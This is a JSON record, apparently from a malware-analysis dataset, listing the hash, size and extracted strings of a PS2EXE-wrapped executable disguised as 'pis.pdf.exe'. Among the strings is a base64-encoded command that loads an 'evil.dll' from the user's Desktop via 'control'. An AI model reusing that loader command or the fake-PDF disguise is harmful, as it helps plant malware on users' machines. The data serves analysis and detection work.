{
    "malware_data": [
        {
            "filename": "0ffa40fa3e03834a51250698ff4352b0702268583249b2d4cf07556c8b7ed3af.exe",
            "filetype": "4D5A9000",
            "filesize": "211KB",
            "hash_sha256": "0ffa40fa3e03834a51250698ff4352b0702268583249b2d4cf07556c8b7ed3af",
            "strings": [
                "!This program cannot be run in DOS mode.",
                ".text",
                "`.rsrc",
                "@.reloc",
                "*.((",
                "PAs+",
                "MY(B",
                "GXs7",
                "-ns.",
                "[XZoZ",
                "7Xs7",
                " `(o",
                "--((",
                "&*Zr",
                "*BSJB",
                "v4.0.30319",
                "#Strings",
                "#GUID",
                "#Blob",
                "<Module>",
                "pis.pdf.exe",
                "CredentialForm",
                "ik.PowerShell",
                "CREDUI_INFO",
                "CREDUI_FLAGS",
                "CredUIReturnCodes",
                "UserPwd",
                "PS2EXEHostRawUI",
                "InputBox",
                "ChoiceBox",
                "ReadKeyBox",
                "KeyboardForm",
                "ProgressForm",
                "ConsoleInfo",
                "FileType",
                "STDHandle",
                "PS2EXEHostUI",
                "PS2EXEHost",
                "ConsoleColorProxy",
                "PS2EXEApp",
                "PS2EXE",
                "mscorlib",
                "System",
                "Object",
                "ValueType",
                "Enum",
                "System.Management.Automation",
                "System.Management.Automation.Host",
                "PSHostRawUserInterface",
                "System.Windows.Forms",
                "Form",
                "PSHostUserInterface",
                "PSHost",
                "System.Text",
                "StringBuilder",
                "CredUIPromptForCredentials",
                "PSCredentialTypes",
                "PSCredentialUIOptions",
                "PromptForPassword",
                ".ctor",
                "cbSize",
                "hwndParent",
                "pszMessageText",
                "pszCaptionText",
                "hbmBanner",
                "value__",
                "INCORRECT_PASSWORD",
                "DO_NOT_PERSIST",
                "REQUEST_ADMINISTRATOR",
                "EXCLUDE_CERTIFICATES",
                "REQUIRE_CERTIFICATE",
                "SHOW_SAVE_CHECK_BOX",
                "ALWAYS_SHOW_UI",
                "REQUIRE_SMARTCARD",
                "PASSWORD_ONLY_OK",
                "VALIDATE_USERNAME",
                "COMPLETE_USERNAME",
                "PERSIST",
                "SERVER_CREDENTIAL",
                "EXPECT_CONFIRMATION",
                "GENERIC_CREDENTIALS",
                "USERNAME_TARGET_CREDENTIALS",
                "KEEP_USERNAME",
                "NO_ERROR",
                "ERROR_CANCELLED",
                "ERROR_NO_SUCH_LOGON_SESSION",
                "ERROR_NOT_FOUND",
                "ERROR_INVALID_ACCOUNT_NAME",
                "ERROR_INSUFFICIENT_BUFFER",
                "ERROR_INVALID_PARAMETER",
                "ERROR_INVALID_FLAGS",
                "User",
                "Password",
                "Domain",
                "ConsoleColor",
                "ncBackgroundColor",
                "ncForegroundColor",
                "get_BackgroundColor",
                "set_BackgroundColor",
                "Size",
                "get_BufferSize",
                "set_BufferSize",
                "Coordinates",
                "get_CursorPosition",
                "set_CursorPosition",
                "get_CursorSize",
                "set_CursorSize",
                "InvisibleForm",
                "FlushInputBuffer",
                "get_ForegroundColor",
                "set_ForegroundColor",
                "BufferCell",
                "Rectangle",
                "GetBufferContents",
                "get_KeyAvailable",
                "get_MaxPhysicalWindowSize",
                "get_MaxWindowSize",
                "KeyInfo",
                "ReadKeyOptions",
                "ReadKey",
                "ScrollBufferContents",
                "SetBufferContents",
                "get_WindowPosition",
                "set_WindowPosition",
                "get_WindowSize",
                "set_WindowSize",
                "get_WindowTitle",
                "set_WindowTitle",
                "BackgroundColor",
                "BufferSize",
                "CursorPosition",
                "CursorSize",
                "ForegroundColor",
                "KeyAvailable",
                "MaxPhysicalWindowSize",
                "MaxWindowSize",
                "WindowPosition",
                "WindowSize",
                "WindowTitle",
                "MB_GetString",
                "DialogResult",
                "Show",
                "System.Collections.ObjectModel",
                "Collection`1",
                "ChoiceDescription",
                "ToUnicode",
                "Keys",
                "GetCharFromKeys",
                "checkKeyDown",
                "keyinfo",
                "KeyEventArgs",
                "KeyboardForm_KeyDown",
                "KeyboardForm_KeyUp",
                "Label",
                "objLblActivity",
                "objLblStatus",
                "ProgressBar",
                "objProgressBar",
                "objLblRemainingTime",
                "objLblOperation",
                "ProgressBarColor",
                "System.Drawing",
                "Color",
                "DrawingColor",
                "InitializeComponent",
                "ProgressRecord",
                "Update",
                "GetStdHandle",
                "GetFileType",
                "IsInputRedirected",
                "IsOutputRedirected",
                "IsErrorRedirected",
                "FILE_TYPE_UNKNOWN",
                "FILE_TYPE_DISK",
                "FILE_TYPE_CHAR",
                "FILE_TYPE_PIPE",
                "FILE_TYPE_REMOTE",
                "STD_INPUT_HANDLE",
                "STD_OUTPUT_HANDLE",
                "STD_ERROR_HANDLE",
                "rawUI",
                "ErrorForegroundColor",
                "ErrorBackgroundColor",
                "WarningForegroundColor",
                "WarningBackgroundColor",
                "DebugForegroundColor",
                "DebugBackgroundColor",
                "VerboseForegroundColor",
                "VerboseBackgroundColor",
                "ProgressForegroundColor",
                "ProgressBackgroundColor",
                "System.Collections.Generic",
                "Dictionary`2",
                "PSObject",
                "FieldDescription",
                "Prompt",
                "PromptForChoice",
                "PSCredential",
                "PromptForCredential",
                "get_RawUI",
                "ibcaption",
                "ibmessage",
                "ReadLine",
                "System.Security",
                "SecureString",
                "getPassword",
                "ReadLineAsSecureString",
                "Write",
                "WriteDebugLine",
                "WriteErrorLine",
                "WriteLine",
                "WriteProgress",
                "WriteVerboseLine",
                "WriteWarningLine",
                "RawUI",
                "parent",
                "System.Globalization",
                "CultureInfo",
                "originalCultureInfo",
                "originalUICultureInfo",
                "Guid",
                "myId",
                "get_PrivateData",
                "_consoleColorProxy",
                "get_CurrentCulture",
                "get_CurrentUICulture",
                "get_InstanceId",
                "get_Name",
                "get_UI",
                "Version",
                "get_Version",
                "EnterNestedPrompt",
                "ExitNestedPrompt",
                "NotifyBeginApplication",
                "NotifyEndApplication",
                "SetShouldExit",
                "PrivateData",
                "CurrentCulture",
                "CurrentUICulture",
                "InstanceId",
                "Name",
                "get_ErrorForegroundColor",
                "set_ErrorForegroundColor",
                "get_ErrorBackgroundColor",
                "set_ErrorBackgroundColor",
                "get_WarningForegroundColor",
                "set_WarningForegroundColor",
                "get_WarningBackgroundColor",
                "set_WarningBackgroundColor",
                "get_DebugForegroundColor",
                "set_DebugForegroundColor",
                "get_DebugBackgroundColor",
                "set_DebugBackgroundColor",
                "get_VerboseForegroundColor",
                "set_VerboseForegroundColor",
                "get_VerboseBackgroundColor",
                "set_VerboseBackgroundColor",
                "get_ProgressForegroundColor",
                "set_ProgressForegroundColor",
                "get_ProgressBackgroundColor",
                "set_ProgressBackgroundColor",
                "get_ShouldExit",
                "set_ShouldExit",
                "get_ExitCode",
                "set_ExitCode",
                "ShouldExit",
                "ExitCode",
                "shouldExit",
                "exitCode",
                "Main",
                "UnhandledExceptionEventArgs",
                "CurrentDomain_UnhandledException",
                "creditUR",
                "targetName",
                "reserved1",
                "iError",
                "userName",
                "maxUserName",
                "password",
                "maxPassword",
                "pfSave",
                "System.Runtime.InteropServices",
                "MarshalAsAttribute",
                "UnmanagedType",
                "flags",
                "caption",
                "message",
                "target",
                "user",
                "credTypes",
                "options",
                "value",
                "rectangle",
                "source",
                "destination",
                "clip",
                "fill",
                "origin",
                "contents",
                "strId",
                "sTitle",
                "sPrompt",
                "sValue",
                "bSecure",
                "aAuswahl",
                "iVorgabe",
                "wVirtKey",
                "wScanCode",
                "lpKeyState",
                "pwszBuff",
                "OutAttribute",
                "cchBuff",
                "wFlags",
                "keys",
                "bShift",
                "bAltGr",
                "bIncludeKeyDown",
                "sender",
                "color",
                "BarColor",
                "objRecord",
                "stdHandle",
                "hFile",
                "descriptions",
                "choices",
                "defaultChoice",
                "allowedCredentialTypes",
                "foregroundColor",
                "backgroundColor",
                "sourceId",
                "record",
                "args",
                "System.Reflection",
                "AssemblyTitleAttribute",
                "AssemblyProductAttribute",
                "AssemblyCopyrightAttribute",
                "AssemblyTrademarkAttribute",
                "AssemblyDescriptionAttribute",
                "AssemblyCompanyAttribute",
                "System.Runtime.CompilerServices",
                "CompilationRelaxationsAttribute",
                "RuntimeCompatibilityAttribute",
                "pis.pdf",
                "DllImportAttribute",
                "credui",
                "String",
                "IsNullOrEmpty",
                "Marshal",
                "SizeOf",
                "IntPtr",
                "Zero",
                "ToString",
                "StructLayoutAttribute",
                "LayoutKind",
                "FlagsAttribute",
                "Empty",
                "Close",
                "set_Opacity",
                "set_ShowInTaskbar",
                "Control",
                "set_Visible",
                "get_Bottom",
                "get_Top",
                "get_Right",
                "get_Left",
                "Address",
                "BufferCellType",
                "set_X",
                "set_Y",
                "set_Height",
                "set_Width",
                "AppDomain",
                "get_CurrentDomain",
                "get_FriendlyName",
                "user32.dll",
                "SizeF",
                "ContainerControl",
                "set_AutoScaleDimensions",
                "AutoScaleMode",
                "set_AutoScaleMode",
                "TextBox",
                "Button",
                "set_Text",
                "Point",
                "set_Location",
                "Screen",
                "FromControl",
                "get_Bounds",
                "get_Width",
                "set_MaximumSize",
                "set_AutoSize",
                "ControlCollection",
                "get_Controls",
                "set_UseSystemPasswordChar",
                "SetBounds",
                "PtrToStringUni",
                "set_DialogResult",
                "Math",
                "set_ClientSize",
                "AddRange",
                "FormBorderStyle",
                "set_FormBorderStyle",
                "FormStartPosition",
                "set_StartPosition",
                "Assembly",
                "GetExecutingAssembly",
                "get_Location",
                "Icon",
                "ExtractAssociatedIcon",
                "set_Icon",
                "set_MinimizeBox",
                "set_MaximizeBox",
                "IButtonControl",
                "set_AcceptButton",
                "set_CancelButton",
                "ShowDialog",
                "get_Text",
                "get_Count",
                "RadioButton",
                "ToolTip",
                "IEnumerator`1",
                "GetEnumerator",
                "get_Current",
                "get_Label",
                "set_Checked",
                "get_Height",
                "get_HelpMessage",
                "SetToolTip",
                "System.Collections",
                "IEnumerator",
                "MoveNext",
                "IDisposable",
                "Dispose",
                "set_ShowAlways",
                "get_Checked",
                "Byte",
                "KeyEventHandler",
                "add_KeyDown",
                "add_KeyUp",
                "get_KeyValue",
                "set_VirtualKeyCode",
                "get_KeyCode",
                "get_Shift",
                "get_Alt",
                "get_Control",
                "get_Chars",
                "set_Character",
                "set_KeyDown",
                "ControlKeyStates",
                "set_ControlKeyState",
                "get_ControlKeyState",
                "get_Modifiers",
                "get_Black",
                "get_Blue",
                "get_Cyan",
                "ColorTranslator",
                "FromHtml",
                "get_Magenta",
                "get_Red",
                "get_White",
                "get_Yellow",
                "SuspendLayout",
                "set_BackColor",
                "set_Left",
                "set_Top",
                "Font",
                "get_Font",
                "FontStyle",
                "set_Font",
                "set_Value",
                "ProgressBarStyle",
                "set_Style",
                "set_ForeColor",
                "set_Size",
                "ResumeLayout",
                "ProgressRecordType",
                "get_RecordType",
                "get_Activity",
                "get_StatusDescription",
                "get_PercentComplete",
                "get_SecondsRemaining",
                "TimeSpan",
                "get_TotalHours",
                "Int32",
                "get_Minutes",
                "get_Seconds",
                "Format",
                "Concat",
                "get_CurrentOperation",
                "Refresh",
                "Application",
                "DoEvents",
                "Kernel32.dll",
                "MessageBox",
                "get_ParameterAssemblyFullName",
                "Type",
                "RuntimeTypeHandle",
                "GetTypeFromHandle",
                "GetType",
                "get_IsArray",
                "GetElementType",
                "Char",
                "MakeGenericType",
                "EmptyTypes",
                "ConstructorInfo",
                "BindingFlags",
                "Binder",
                "ParameterModifier",
                "GetConstructor",
                "Invoke",
                "Convert",
                "ChangeType",
                "InvokeMember",
                "Array",
                "op_Inequality",
                "op_Equality",
                "get_DefaultValue",
                "Exception",
                "ToCharArray",
                "AppendChar",
                "Console",
                "ConsoleKeyInfo",
                "ConsoleKey",
                "get_Key",
                "get_Length",
                "RemoveAt",
                "get_KeyChar",
                "MessageBoxButtons",
                "MessageBoxIcon",
                "System.Threading",
                "Thread",
                "get_CurrentThread",
                "NewGuid",
                "AsPSObject",
                "ArgumentNullException",
                "STAThreadAttribute",
                "<>c__DisplayClass5",
                "ManualResetEvent",
                "DataAddedEventArgs",
                "<Main>b__0",
                "IAsyncResult",
                "<Main>b__2",
                "<>c__DisplayClass7",
                "CS$<>8__locals6",
                "PSDataCollection`1",
                "colOutput",
                "<Main>b__1",
                "ErrorRecord",
                "get_Index",
                "get_Item",
                "get_IsCompleted",
                "EventWaitHandle",
                "EnableVisualStyles",
                "UnhandledExceptionEventHandler",
                "add_UnhandledException",
                "System.Management.Automation.Runspaces",
                "RunspaceFactory",
                "Runspace",
                "CreateRunspace",
                "ApartmentState",
                "set_ApartmentState",
                "Open",
                "PowerShell",
                "Create",
                "set_Runspace",
                "PSDataStreams",
                "get_Streams",
                "get_Error",
                "EventHandler`1",
                "add_DataAdded",
                "Complete",
                "Compare",
                "StringComparison",
                "StartsWith",
                "StringSplitOptions",
                "Split",
                "Trim",
                "System.Diagnostics",
                "Debugger",
                "Launch",
                "Encoding",
                "get_UTF8",
                "FromBase64String",
                "GetString",
                "System.IO",
                "File",
                "WriteAllText",
                "AddScript",
                "System.Text.RegularExpressions",
                "Regex",
                "Match",
                "Group",
                "get_Success",
                "GroupCollection",
                "get_Groups",
                "AddParameter",
                "Capture",
                "get_Value",
                "ToUpper",
                "Boolean",
                "AddArgument",
                "AddCommand",
                "AsyncCallback",
                "PSInvocationSettings",
                "BeginInvoke",
                "WaitHandle",
                "WaitOne",
                "Stop",
                "PSInvocationStateInfo",
                "get_InvocationStateInfo",
                "PSInvocationState",
                "get_State",
                "get_Reason",
                "get_Message",
                "CompilerGeneratedAttribute",
                "WrapNonExceptionThrows",
                "_CorExeMain",
                "mscoree.dll",
                "IHDR",
                "pHYs",
                "IDATx",
                "2;3;Z",
                "]kV4",
                "fEcw",
                "&0|^",
                "C<a<",
                "\"xA@\"a8",
                "QYF'",
                "[w$\\",
                "cx49",
                "|0^/",
                "CzK4",
                "[=9_",
                "W:R+",
                "\\CCr",
                "@L92",
                "W=LTH",
                "*AXU",
                "Zr0+",
                ":eW=8",
                "O70Q>#c",
                "C=db",
                "*ZL6tZ",
                "N@rh",
                "J4r|S",
                "eW=X",
                "Cv&&m",
                "Qu.B",
                "98xYS",
                "\"}~@",
                "7g6<5",
                "~1Hy",
                "AT_KJ",
                "jQy(",
                "dT_w",
                ":E V;",
                "0<l@L",
                "H<M^",
                "W@b]",
                "M_&r",
                "8C=p",
                "_y5U7c",
                ":\"')",
                "jC`4",
                "W=('",
                "PX/d",
                "^Q/T8",
                ")2:w#r",
                "Q}UU`8",
                "~K5M=",
                "z+x8",
                "'0=I",
                "B<N|I",
                "[:u=A",
                "d_=D",
                "C|`@E",
                "-Y0?",
                "19X+k",
                "AhQ4}",
                "wt@H",
                "TCN/w",
                ":>4,",
                "2-P8",
                "DbiU0jO",
                "TQ&s",
                "0;ro",
                "(&7J",
                "|hyY/",
                "-M!u$",
                ")`X=",
                "zj;s",
                ",mxA\"",
                "M?1ILC4",
                "t73r'",
                "{rz:",
                "C.&&",
                "^6}:",
                "d<Iv*",
                "Hq@r",
                "e3gY(",
                ":iLX",
                "ClhH",
                "Z{(t8",
                "K$@s'5",
                "'-_{J",
                "0mkp",
                "z mH",
                "b35t",
                "_yUNg",
                "[=Hdi",
                "V@64",
                "?_@<",
                "eM;+",
                "\\Q~l",
                ">);=",
                "=(#r",
                "2}?\"",
                "GIuu",
                "|QqF",
                "f02T",
                "Fb].8",
                "c#+,",
                "r <G'",
                "ZXi7",
                "E{s3=/",
                "X1h:",
                "IDAT",
                ":bq{",
                "_ 6=;y",
                "PZ]MI#]\"3",
                "-z0\"",
                "N|%%",
                "FVfi",
                "C#K)",
                "=^mo",
                "DIU%",
                "#X[kZ",
                "b445",
                "~I#&M",
                "KP3o",
                ":,:m%",
                "8Lij",
                "Z0ki9",
                "_}5U",
                "U3f`",
                "'`R=",
                "s*./",
                "O?Ed$",
                "7~{/>~",
                "aY3<4",
                "OV%S=o",
                "Fzz0",
                "Ys%Z6o",
                ":wlG",
                "@>aT?",
                "nuST[s3~",
                "G#`SO",
                "Fz{m",
                "crC ",
                "4WP\\Q!",
                "G$9:",
                "Yy7dCc#",
                "B@ks3Z",
                "&}e9",
                "LV.t",
                "S=dw",
                "FD^,v",
                "'&5e",
                "MXW=",
                "hAK.",
                "`21Y",
                "-oN2\"",
                "/5eoq",
                "D$5L^",
                ",km>J",
                "Ad_=X",
                "ee85",
                "NLnlT",
                "Jc6S",
                "A=Hg4y",
                " X7?8",
                "@6l~p",
                "uiL[",
                "u7j4$!A",
                "_Y.ks",
                "<5n\"",
                "\\Pw+p",
                "Ho/^",
                "EE>H_",
                "PN@E:;,1",
                "{9-ha[",
                "P1@h",
                "gR9|",
                "rR1]j",
                "U)y\":y",
                "3:cf",
                ":n(D",
                "nJvfU",
                "XUUY",
                "> =Y",
                "=E#q",
                "p!8U",
                "pAmu",
                "^LS_",
                "Myb=[",
                "!icJ",
                "U=dch",
                "h\\Bx!M",
                "X5yrY)",
                "q*),",
                "Rk(b",
                "CzE=",
                "@6pI",
                "@6,U:F=;",
                "(xJK",
                ")H%20<",
                "\\^]]",
                "dXEh4",
                "2 a`(",
                "xmO=",
                "A{MS",
                "7^zv3",
                "'Ry*",
                "wu]E",
                "SODj\\",
                "8x^@g",
                "H@X!",
                "|yYy",
                "3>FT9",
                "R]\\]",
                "qowg",
                "5weTZRZ",
                "'5k%)(7",
                "RemE P",
                "Qh{}",
                "O2}cz(oM",
                "dQ5w>",
                "Et(9Y",
                "2XR>y",
                " *=A",
                "_<M1",
                "%!w*Y",
                "@g[g",
                "@e%j",
                "`5=;",
                "EWY(",
                "U>yev",
                "}{v!",
                "lWYP",
                "ORN$",
                "zY0,",
                "pG;F",
                "$y0`=",
                "daR.",
                "u]}I",
                "kmF.Y",
                "-*=}",
                "Gow#m",
                "v1 z",
                ",FCat",
                "(m37;",
                "E_W?",
                "uu_w",
                "rlQQqp",
                "tvyeuprM",
                "TT\\2",
                "\"WDA",
                "c-06~",
                " Oh2H",
                "Q,]~|",
                "&HarI",
                "[m-{",
                "HQX-",
                "IEND",
                " RJC8^ULPdZQgh]T~",
                "wj`y*&\"*",
                ">72$WNF<`VMTe[Rkh^T",
                "($ :",
                "G@:(ZQH@aWOWf[Roi^U",
                "MF?,[RJCcXP[g\\Ssj_U",
                "QIB/]SKGdYP_g\\Sv}pe",
                "SKC4_UMKeZQch]Tz",
                "WOG6`VMOe[Rgh^T~",
                "Jh^Tdi^U}",
                "KC=p",
                "SJCR",
                "g\\Sw",
                "/*&.2-(><50Orh\\h~sf~",
                "4/*A",
                "+A:4:_VLSf]SkkaV",
                "<61(G@9>LD=U]TKo",
                "0+'e",
                ",($%1,(54.*FbXOZ{ocr",
                "72-y",
                "/YPHGcZP^i_Uv",
                "($ t",
                "B[RI\\",
                "+'#y",
                "E>8z",
                ",'#W",
                "[RJp",
                "3A;4F^UL_d\\Qw",
                "GA9Q",
                ">822E?8KTLDb|qd{",
                ".*%P",
                ".)%&-($9NF?Nf\\RglcW",
                "B<5{",
                "$JC<:MF>S\\SJj",
                ",($y",
                "<61\\",
                "i_Vy",
                "1,'5B;5Mc[PflcW~",
                "3.)C",
                "2-) 2-(9HA:Qf]RjmdX",
                "=82$3-)=RJBUh_Tmtk^",
                " |re;vk_UjaVo{qc",
                "1,(f",
                "@:3'KD=>YRHVzpclf^S\\",
                "C=6(PIABWPFZmeXr{rc",
                "E?8k",
                "SLC,SLCEc[P^iaUv",
                "QJC]",
                "z\\VN",
                "VOE0e^RIsk]b}uf{",
                "yob2qh[M{rdf",
                ")&\"r",
                "WPF173-",
                "XQG6nfYO",
                "2.)~",
                "\\UM;",
                "IC;7_YMQwo`jzrcl",
                "*'$l",
                "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
                "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">",
                "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>",
                "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">",
                "    <security>",
                "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">",
                "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>",
                "      </requestedPrivileges>",
                "    </security>",
                "  </trustInfo>",
                "</assembly>",
                "N0L0",
                " hEB",
                "Some-State1!0",
                "Internet Widgits Pty Ltd0",
                "240110173941Z",
                "250109173941Z0E1",
                "*5=O_",
                "2y.7",
                "F*W{",
                "S0Q0",
                "]{iKVA",
                "N'_'7",
                "0]0E1",
                "Internet Widgits Pty Ltd",
                "S)<S",
                "1`6\"",
                "Secure input:   ",
                "Input:          ",
                "Cancel",
                "Press a key",
                "#000080",
                "#808080",
                "#008000",
                "#008080",
                "#800080",
                "#800000",
                "#808000",
                "#C0C0C0",
                "#00FF00",
                "Progress",
                "Remaining time: ",
                "{0:00}:{1:00}:{2:00}",
                "System.Collections.Generic.List",
                "{0}[{1}]: ",
                "ToArray",
                "{0}: ",
                "(Type !? for help.)",
                "Wrong format, please repeat input: ",
                "PS2EXE_Host",
                "-wait",
                "-extract",
                "If you specify the -extract option you need to add a file for extraction in this way",
                "   -extract:\"<filename>\"",
                "-end",
                "-debug",
                "Y29udHJvbCAiJGVudjp1c2VycHJvZmlsZVxEZXNrdG9wXGV2aWwuZGxsIg==",
                "^-([^: ]+)[ :]?([^:]*)$",
                "True",
                "$TRUE",
                "False",
                "$FALSE",
                "out-string",
                "stream",
                "An exception occured: ",
                "Click OK to exit...",
                "Unhandled exception in PS2EXE",
                "VS_VERSION_INFO",
                "VarFileInfo",
                "Translation",
                "StringFileInfo",
                "000004b0",
                "FileDescription",
                "FileVersion",
                "0.0.0.0",
                "InternalName",
                "LegalCopyright",
                "OriginalFilename",
                "ProductVersion",
                "Assembly Version"
            ]
        }
    ]
}